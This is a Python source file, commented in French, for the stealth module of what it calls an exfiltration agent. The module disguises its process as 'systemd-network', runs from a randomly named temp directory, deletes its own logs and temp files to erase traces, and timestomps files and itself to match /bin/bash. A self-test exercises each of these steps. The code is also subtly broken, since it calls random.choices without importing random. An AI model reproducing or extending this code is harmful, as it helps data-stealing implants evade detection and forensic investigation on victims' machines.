import os
import sys
import time
import platform
import shutil
import stat # Pour les permissions de fichiers
from datetime import datetime

# Importer le logger (sera utilisé dans l'agent principal)
# from modules.logger import Logger

class StealthMode:
    """
    Implémente diverses techniques pour rendre l'agent plus furtif:
    masquage de processus, utilisation de répertoires temporaires,
    nettoyage des traces, et timestomping.
    """

    DEFAULT_TMP_DIR = "/data/local/tmp" if platform.system() == "Android" else "/tmp"
    LOG_FILENAME = "agent_logs.enc" # Nom du fichier de logs chiffré (doit correspondre à config.py)

    def __init__(self, logger=None, debug_mode: bool = False):
        """
        Initialise le module de furtivité.
        :param logger: Instance du logger pour la journalisation.
        :param debug_mode: Si True, la furtivité est réduite/désactivée pour faciliter le débogage.
        """
        self.logger = logger
        self.debug_mode = debug_mode
        self.original_pwd = os.getcwd() # Sauvegarder le répertoire de travail original
        self.temp_dir_path = None # Chemin du répertoire temporaire créé
        
        # Obtenir le chemin de base du script en cours d'exécution
        self.script_dir = os.path.dirname(os.path.abspath(__file__))
        # Le répertoire principal du projet est le parent du répertoire 'modules'
        self.project_root_dir = os.path.dirname(self.script_dir)

        if self.logger:
            self.logger.log_debug(f"[StealthMode] Initialisé. Debug Mode: {self.debug_mode}")
            self.logger.log_debug(f"[StealthMode] Project Root: {self.project_root_dir}")


    def _log(self, level, message):
        """Helper pour logguer si un logger est disponible."""
        if self.logger:
            getattr(self.logger, f"log_{level}")(f"[StealthMode] {message}")
        else:
            print(f"[{level.upper()}] [StealthMode] {message}")

    def enable_stealth(self):
        """Active toutes les mesures de furtivité, sauf si en mode debug."""
        if self.debug_mode:
            self._log("info", "Mode furtif désactivé (mode debug actif).")
            return

        self._log("info", "Activation du mode furtif...")
        self.change_process_name("systemd-network") # Exemple de nom de processus à masquer
        self.change_working_directory()
        # self.hide_process_from_ps() # Plus complexe, souvent nécessite des privilèges ou injection
        # self.timestomp_self() # À appeler si l'agent veut modifier ses propres timestamps

    def disable_stealth(self):
        """Désactive les mesures de furtivité et nettoie les traces."""
        if self.debug_mode:
            self._log("info", "Pas de nettoyage car mode debug actif.")
            return
            
        self._log("info", "Désactivation du mode furtif et nettoyage des traces...")
        self.restore_working_directory()
        self.clean_up_logs_and_temp_files()
        # Ajoutez ici d'autres fonctions de nettoyage si nécessaire

    def change_process_name(self, new_name: str):
        """
        Tente de changer le nom du processus visible (process masquerading).
        Cela fonctionne sur certains systèmes et interpréteurs Python, mais pas toujours
        de manière fiable ou persistante.
        Sur Linux/Termux, cela peut modifier sys.argv[0].
        Pour un changement plus robuste, il faudrait des privilèges ou des techniques avancées.
        """
        try:
            # sys.ps1 est utilisé par l'interpréteur interactif
            # sys.argv[0] est le nom du script
            if platform.system() in ["Linux", "Darwin"]: # Unix-like systems
                # Sur Linux, modifier sys.argv[0] peut changer le nom visible dans 'ps'
                # mais ce n'est pas toujours fiable ou persistant, et ne change pas le "comm" du processus.
                # Pour un changement plus robuste du nom de processus (comm), il faudrait des appels système C,
                # ou l'utilisation de bibliothèques comme .
                # Pour l'agent d'exfiltration, changer sys.argv[0] est un premier niveau de masquage.
                sys.argv[0] = new_name
                self._log("debug", f"Nom de sys.argv[0] changé en '{new_name}'.")
            elif platform.system() == "Windows":
                # Sur Windows, il n'y a pas de moyen direct en Python pur pour changer le nom du processus.
                # Cela nécessiterait ctypes et des appels à l'API Windows, ou des bibliothèques tierces.
                self._log("warning", "Le changement de nom de processus n'est pas directement supporté sur Windows en Python pur.")
            
            # Note: psutil.Process().name() peut ne pas refléter ce changement sans privilèges
            self._log("info", f"Tentative de changement de nom de processus en '{new_name}'.")
        except Exception as e:
            self._log("error", f"Erreur lors du changement de nom de processus: {e}")

    def change_working_directory(self):
        """
        Change le répertoire de travail de l'agent vers un répertoire temporaire.
        Ceci aide à dissimuler la source d'exécution et à stocker des fichiers temporaires.
        """
        try:
            # Créer le répertoire temporaire si nécessaire
            # Utilise un sous-répertoire aléatoire pour éviter les collisions
            unique_tmp_name = "sys_tmp_" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
            self.temp_dir_path = os.path.join(self.DEFAULT_TMP_DIR, unique_tmp_name)
            
            os.makedirs(self.temp_dir_path, exist_ok=True)
            os.chdir(self.temp_dir_path)
            self._log("info", f"Répertoire de travail changé en '{self.temp_dir_path}'.")
        except Exception as e:
            self._log("error", f"Erreur lors du changement de répertoire de travail: {e}")
            self.temp_dir_path = None # Réinitialiser en cas d'échec

    def restore_working_directory(self):
        """
        Restaure le répertoire de travail original si l'agent l'a modifié.
        """
        try:
            if os.getcwd() != self.original_pwd:
                os.chdir(self.original_pwd)
                self._log("info", f"Répertoire de travail restauré à '{self.original_pwd}'.")
        except Exception as e:
            self._log("error", f"Erreur lors de la restauration du répertoire de travail: {e}")

    def clean_up_logs_and_temp_files(self):
        """
        Supprime les fichiers de journalisation et les répertoires temporaires créés par l'agent.
        """
        self._log("info", "Nettoyage des fichiers de journalisation et temporaires...")
        
        # Supprimer le fichier de logs chiffré
        log_file_path = os.path.join(self.project_root_dir, self.LOG_FILENAME)
        if os.path.exists(log_file_path):
            try:
                os.remove(log_file_path)
                self._log("info", f"Fichier de logs supprimé: '{log_file_path}'.")
            except Exception as e:
                self._log("error", f"Impossible de supprimer le fichier de logs '{log_file_path}': {e}")
        else:
            self._log("debug", f"Fichier de logs '{log_file_path}' non trouvé, pas de suppression nécessaire.")

        # Supprimer le répertoire temporaire s'il a été créé et existe
        if self.temp_dir_path and os.path.exists(self.temp_dir_path):
            try:
                # Assurez-vous que nous ne sommes pas dans le répertoire que nous essayons de supprimer
                if os.getcwd() == self.temp_dir_path:
                    self._log("warning", f"Impossible de supprimer le répertoire temporaire '{self.temp_dir_path}' car l'agent s'y trouve toujours. Le nettoyage pourrait échouer.")
                    # Revenir au répertoire d'origine avant de tenter de supprimer le temporaire
                    self.restore_working_directory()
                    # Si on ne peut pas revenir, la suppression échouera.
                    if os.getcwd() == self.temp_dir_path:
                         self._log("error", f"Toujours dans le répertoire temporaire, impossible de le supprimer.")
                         return

                shutil.rmtree(self.temp_dir_path)
                self._log("info", f"Répertoire temporaire supprimé: '{self.temp_dir_path}'.")
            except Exception as e:
                self._log("error", f"Impossible de supprimer le répertoire temporaire '{self.temp_dir_path}': {e}")
        else:
            self._log("debug", "Aucun répertoire temporaire à supprimer.")

    def timestomp_file(self, filepath: str, new_mtime: float = None, new_atime: float = None):
        """
        Modifie les timestamps (modification et accès) d'un fichier.
        Utile pour masquer l'heure d'activité de l'agent.
        Si new_mtime/new_atime sont None, l'heure actuelle est utilisée.
        """
        if not os.path.exists(filepath):
            self._log("warning", f"Impossible de timestomper '{filepath}': Fichier non trouvé.")
            return

        try:
            # Obtenir les timestamps actuels si non spécifiés
            current_stat = os.stat(filepath)
            mtime = new_mtime if new_mtime is not None else current_stat.st_mtime
            atime = new_atime if new_atime is not None else current_stat.st_atime
            
            os.utime(filepath, (atime, mtime))
            self._log("info", f"Timestamps de '{filepath}' modifiés. Mtime: {datetime.fromtimestamp(mtime)}, Atime: {datetime.fromtimestamp(atime)}.")
        except Exception as e:
            self._log("error", f"Erreur lors du timestomping de '{filepath}': {e}")

    def timestomp_self(self):
        """
        Tente de timestomper le script de l'agent lui-même.
        C'est une technique avancée car elle peut être compliquée si le script est en cours d'exécution.
        """
        script_path = os.path.abspath(sys.argv[0]) # Chemin du script exécuté
        if not os.path.exists(script_path):
            self._log("warning", f"Impossible de timestomper l'agent lui-même : script '{script_path}' non trouvé.")
            return

        try:
            # Utiliser l'heure de modification d'un fichier système courant pour se fondre
            # Par exemple, /bin/bash ou python executable
            if platform.system() == "Linux" or platform.system() == "Android":
                # Tenter de trouver un binaire système commun pour imiter son timestamp
                ref_file = "/bin/bash" if os.path.exists("/bin/bash") else "/usr/bin/python3"
                if os.path.exists(ref_file):
                    ref_stat = os.stat(ref_file)
                    self.timestomp_file(script_path, ref_stat.st_mtime, ref_stat.st_atime)
                    self._log("info", f"Timestomp de l'agent effectué avec les timestamps de '{ref_file}'.")
                else:
                    self._log("warning", "Pas de fichier de référence pour le timestomp de l'agent.")
            else:
                 self._log("warning", "Timestomp du propre agent non implémenté pour ce système.")

        except Exception as e:
            self._log("error", f"Erreur lors du timestomping du propre agent: {e}")

# --- Partie de test (à exécuter si le fichier est lancé directement) ---
if __name__ == "__main__":
    print("[+] Test du module StealthMode...")

    class MockLogger:
        def log_info(self, msg): print(f"[INFO] {msg}")
        def log_warning(self, msg): print(f"[WARN] {msg}")
        def log_error(self, msg): print(f"[ERROR] {msg}")
        def log_debug(self, msg): print(f"[DEBUG] {msg}")

    logger = MockLogger()
    
    # Test 1: Mode normal (furtivité activée)
    print("\n--- Test 1: Mode furtif activé ---")
    stealth_agent = StealthMode(logger=logger, debug_mode=False)
    stealth_agent.enable_stealth()
    
    # Vérifier le répertoire de travail
    current_wd = os.getcwd()
    print(f"[*] Répertoire de travail actuel: {current_wd}")
    assert stealth_agent.temp_dir_path is not None and current_wd == stealth_agent.temp_dir_path, "Le répertoire de travail n'a pas été changé correctement."
    assert os.path.exists(current_wd), "Le répertoire temporaire n'existe pas."
    
    # Créer un faux fichier de log pour le nettoyage
    fake_log_path = os.path.join(stealth_agent.project_root_dir, stealth_agent.LOG_FILENAME)
    with open(fake_log_path, "w") as f:
        f.write("Fake log content.\n")
    print(f"[*] Faux fichier de log créé pour le test: {fake_log_path}")

    # Créer un fichier de test pour le timestomp
    test_file_to_stomp = os.path.join(current_wd, "test_file_to_stomp.txt")
    with open(test_file_to_stomp, "w") as f:
        f.write("Some content.")
    print(f"[*] Fichier de test pour timestomp créé: {test_file_to_stomp}")
    original_mtime = os.stat(test_file_to_stomp).st_mtime
    print(f"[*] Original mtime: {datetime.fromtimestamp(original_mtime)}")
    
    # Timestomp le fichier
    past_time = time.time() - (3600 * 24 * 30) # Il y a 30 jours
    stealth_agent.timestomp_file(test_file_to_stomp, new_mtime=past_time)
    new_mtime = os.stat(test_file_to_stomp).st_mtime
    print(f"[*] Nouveau mtime: {datetime.fromtimestamp(new_mtime)}")
    assert new_mtime < original_mtime, "Timestomp n'a pas fonctionné."

    # Timestomp du propre agent (cela modifiera le timestamp du fichier 'stealth_mode.py')
    print("\n[*] Tentative de timestomp de ce script lui-même (peut ne pas être visible sans vérifier le système de fichiers).")
    stealth_agent.timestomp_self()

    # Nettoyage
    stealth_agent.disable_stealth()
    print(f"[*] Répertoire après nettoyage: {os.getcwd()}") # Doit être revenu à l'original
    assert os.getcwd() == stealth_agent.original_pwd, "Le répertoire de travail n'a pas été restauré."
    assert not os.path.exists(stealth_agent.temp_dir_path), "Le répertoire temporaire n'a pas été supprimé."
    assert not os.path.exists(fake_log_path), "Le faux fichier de log n'a pas été supprimé."

    # Test 2: Mode debug (furtivité désactivée)
    print("\n--- Test 2: Mode debug (furtivité désactivée) ---")
    stealth_debug_agent = StealthMode(logger=logger, debug_mode=True)
    stealth_debug_agent.enable_stealth() # Ne devrait rien faire de furtif
    assert os.getcwd() == stealth_debug_agent.original_pwd, "Le répertoire de travail a été changé en mode debug."
    
    # Créer un faux fichier de log pour le test de non-suppression
    fake_log_path_debug = os.path.join(stealth_debug_agent.project_root_dir, stealth_debug_agent.LOG_FILENAME + "_debug")
    with open(fake_log_path_debug, "w") as f:
        f.write("Fake log content debug.\n")
    
    stealth_debug_agent.clean_up_logs_and_temp_files() # Ne devrait pas supprimer en mode debug
    assert os.path.exists(fake_log_path_debug), "Le faux fichier de log a été supprimé en mode debug."
    os.remove(fake_log_path_debug) # Nettoyage manuel pour ce test

    print("\n[+] Tests du module StealthMode terminés.")
    print("[!] Certains effets (comme le changement de nom de processus) peuvent être difficiles à observer directement via 'ps' ou similaires sans root ou techniques avancées sur certains systèmes.")

